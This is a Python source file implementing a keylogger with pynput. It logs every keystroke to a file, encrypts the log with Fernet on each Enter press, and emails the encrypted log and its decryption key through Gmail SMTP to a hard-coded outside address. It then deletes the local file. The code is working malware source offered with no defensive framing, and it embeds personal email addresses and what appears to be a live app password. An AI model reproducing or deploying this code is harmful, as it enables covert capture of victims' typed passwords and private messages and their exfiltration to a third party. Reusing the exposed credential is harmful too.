import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import os

def write_to_file(key):
    key_pressed = str(key)
    key_pressed = key_pressed.replace("'", "")
    if key_pressed == 'Key.space':
        key_pressed = ' '
    if key_pressed == 'Key.backspace':
        key_pressed = '  '
    if key_pressed == 'Key.ctrlc':
        key_pressed = ''
    if key_pressed == 'Key.shift' or key_pressed == 'Key.caps_lock':
        key_pressed = ''
    if key_pressed == 'Key.enter':
        key_pressed = "\n"
        send_email()  # Call the send_email function when Enter is pressed
    with open("log.txt", "a") as f:
        f.write(key_pressed)

def send_email():
    sender = "tanyinsobright237@gmail.com"
    recipient = "wasiemmanuela183@gmail.com"
    subject = "Keylogger Alert - Encrypted Log File"

    # Generate a new Fernet key for encryption
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)

    # Read the log file content
    with open("log.txt", "rb") as f:
        log_data = f.read()

    # Encrypt the log data
    encrypted_data = cipher_suite.encrypt(log_data)

    # Write the encrypted data to a new file
    encrypted_filename = "log_encrypted.txt"
    with open(encrypted_filename, "wb") as f:
        f.write(encrypted_data)

    # Prepare the email message
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = recipient

    # Attach the encrypted log file
    with open(encrypted_filename, "rb") as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename=encrypted_filename)
        message.attach(attachment)

    # Include the encryption key in the email body (base64 encoded for readability)
    body = f"The keylogger has detected some activity. The log file is encrypted.\n\n"
    body += f"Use the following key to decrypt the log file:\n{key.decode()}\n"
    message.attach(MIMEText(body))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
            smtp.starttls()
            smtp.login(sender, "kpoq vsww dbnt fzfn")  # Use your actual app password here
            smtp.sendmail(sender, recipient, message.as_string())
        print("Encrypted email sent successfully!")
    except smtplib.SMTPException as e:
        print(f"Error sending email: {e}")

    # Delete the log file after sending the email
    if os.path.exists("log.txt"):
        os.remove("log.txt")

with Listener(on_press=write_to_file) as l:
    l.join()
